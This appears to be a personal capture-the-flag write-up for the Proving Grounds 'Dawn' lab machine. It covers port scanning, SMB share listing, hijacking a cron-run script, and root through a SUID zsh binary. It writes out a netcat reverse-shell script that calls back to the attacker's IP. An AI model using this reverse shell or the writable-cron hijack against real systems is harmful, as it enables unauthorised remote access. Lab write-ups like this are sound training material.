---
title: "PG Play: Dawn"
created: "2023-09-23"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "Dawn"
os: Linux
status: rooted
tags:
  - - proving-grounds
  - pg-play
  - linux
  - ctf
  - oscp
  - suid-exploitation
  - gtfobins-exploit
  - sudo-misconfiguration
  - suid-enumeration
  - cron-job-abuse
related:
  - "[[GTFObins-SUID-Quick-Reference]]"
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Reverse-Shell-Reference]]"
  - "[[File-Upload-to-RCE-Patterns]]"
  - "[[SMB-Enumeration-Exploitation]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: Dawn

> **Platform:** Proving Grounds Play | **OS:** Linux | **Date:** 2023-09-23

---

## Quick Summary

**Open Ports:**
- 80/tcp (http)
- 139/tcp (netbios-ssn)
- 445/tcp (netbios-ssn)
- 3306/tcp (mysql)

**Key Techniques:**
- SUID Exploitation
- GTFObins Exploit
- Sudo Misconfiguration
- SUID Enumeration
- Cron Job Abuse
- Reverse Shell
- File Upload
- SMB Enumeration

**Privilege Escalation Path:**
- SUID → GTFObins
- sudo -l abuse
- Cron job abuse

---

## Full Walkthrough

Proving grounds Play - Dawn CTF writeup.

## Nmap

```sh
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
```

## Web PORT: 80

### Directory Fuzzing


### Logs


## SMB Enumeration

```sh
smbclient -L //192.168.175.11/ -N
```


As per the `management.log` file there is a cron job running on `ITDEPT` folder, and in SMB we have access to the ITDEPT folder.

```log
2020/08/12 09:03:02 [31;1mCMD: UID=1000 PID=939    | /bin/sh -c /home/dawn/ITDEPT/product-control [0m
```

Create file named `product-control` add a reverse shell code to the file and upload it in the SMB server.

```sh
#!/bin/bash
nc -c bash 192.168.45.223 1234
```

So when the cronjob runs the script we will get the reverse shell.


Wait for few seconds for the cron job to run.


**Initial Foothold Obtained**

## Privilege Escalation

Check the user permissions `sudo -l` the user  `Dawn` has permission to run `/usr/bin/msql` without password. But unfortunately it didn't work.

### SUIDs

```sh
dawn@dawn:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/mount.cifs
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/zsh #Odd to be here
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
```

The SUID `zsh` is exploitable, direct to GTFO bins and find the exploit.


**Root Obtained**

---

## Technique Links

- [[GTFObins-SUID-Quick-Reference]]
- [[Linux-PrivEsc-Decision-Tree]]
- [[Reverse-Shell-Reference]]
- [[File-Upload-to-RCE-Patterns]]
- [[SMB-Enumeration-Exploitation]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
